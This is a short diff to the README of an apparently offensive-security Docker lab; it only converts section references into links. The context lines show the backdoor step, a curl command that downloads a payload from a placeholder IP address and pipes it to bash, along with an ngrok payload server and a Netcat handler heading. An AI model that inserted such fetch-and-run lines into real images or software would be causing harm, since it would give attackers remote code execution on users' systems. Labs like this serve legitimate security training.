@@ -12,7 +12,7 @@ The line that ends up backdooring the image will be the following:
 
 ```curl -s http://<ip_address>:8000/payload.txt | bash```
 
-For added security use public key pinning (See the section to "Using ngrok for your payload server address"):
+For added security use public key pinning (See the section [Using ngrok for your payload server address](https://github.com/sneakerhax/OffensiveDocker/blob/main/Labs/backdoored_image_sh/README.md#using-ngrok-for-your-payload-server-address)):
 
 ```curl -Iksv --pinnedpubkey sha256//0 https://<your_site>.com```
 
@@ -52,7 +52,7 @@ Next you need to setup the server that will host the file containing your payloa
 
 ```ngrok http 8000 -bind-tls=true```
 
-Starts an ngrok listener and gives you a public address (You will need to follow the "Building the image" section to grab the certificate)
+Starts an ngrok listener and gives you a public address (You will need to follow the [Building the image](https://github.com/sneakerhax/OffensiveDocker/tree/main/Labs/backdoored_image_sh#building-the-image) section to grab the certificate)
 
 ## Start your Netcat handler
 
